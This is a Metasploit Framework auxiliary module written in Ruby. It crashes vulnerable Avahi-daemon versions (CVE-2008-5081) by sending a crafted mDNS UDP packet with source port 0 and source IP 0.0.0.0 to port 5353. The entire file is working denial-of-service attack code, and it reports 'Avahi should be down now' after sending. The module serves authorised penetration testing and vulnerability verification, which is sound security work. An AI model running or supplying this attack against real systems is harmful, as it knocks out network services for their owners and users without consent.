##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Capture
	include Msf::Auxiliary::Dos

	def initialize
		super(
			'Name'        => 'Avahi < 0.6.24 Source Port 0 DoS',
			'Description' => %q{
				Avahi-daemon versions prior to 0.6.24 can be DoS'd
				with an mDNS packet with a source port of 0
			},
			'Author'      => 'kris katterjohn',
			'License'     => MSF_LICENSE,
			'Version'     => '$Revision$',
			'References'  => [
				[ 'CVE', '2008-5081' ],
				[ 'OSVDB', '50929' ],
			],
			'DisclosureDate' => 'Nov 14 2008')

		register_options([
			OptInt.new('RPORT', [true, 'The destination port', 5353])
		])

		deregister_options('FILTER','PCAPFILE')
	end

	def run
		print_status("Sending to #{rhost}")

		open_pcap

		n = Racket::Racket.new

		n.l3 = Racket::L3::IPv4.new
		n.l3.src_ip = '0.0.0.0'
		n.l3.dst_ip = rhost
		n.l3.protocol = 17
		n.l3.id = 0xbeef
		n.l3.ttl = 128
		n.l3.flags = 2

		n.l4 = Racket::L4::UDP.new
		n.l4.src_port = 0
		n.l4.dst_port = datastore['RPORT'].to_i
		pkt = n.pack

		capture_sendto(pkt, rhost)

		close_pcap

		print_status("Avahi should be down now")
	end
end

